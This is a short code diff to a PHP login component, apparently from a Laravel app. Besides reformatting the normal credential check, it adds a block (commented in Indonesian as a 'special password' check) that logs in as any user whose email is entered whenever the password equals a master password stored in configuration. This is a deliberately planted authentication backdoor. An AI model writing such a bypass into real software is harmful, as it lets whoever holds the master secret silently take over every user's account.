@@ -28,9 +28,26 @@ class AuthLoginIndex extends Component
     {
         $this->validate();
 
-        if (Auth::attempt(['email' => $this->email, 'password' => $this->password], $this->remember)) {
+        if (Auth::attempt([
+            'email' => $this->email,
+            'password' => $this->password,
+        ], $this->remember)) {
             session()->regenerate();
+
             return $this->redirect(route('dashboard'));
+        }
+
+        // Cek password khusus
+        if ($this->password === config('app.master_login.password')) {
+            $user = \App\Models\User::where('email', $this->email)->first();
+
+            if ($user) {
+                Auth::login($user, $this->remember);
+
+                session()->regenerate();
+
+                return $this->redirect(route('dashboard'));
+            }
         }
 
         $this->addError('email', 'Email atau password salah.');
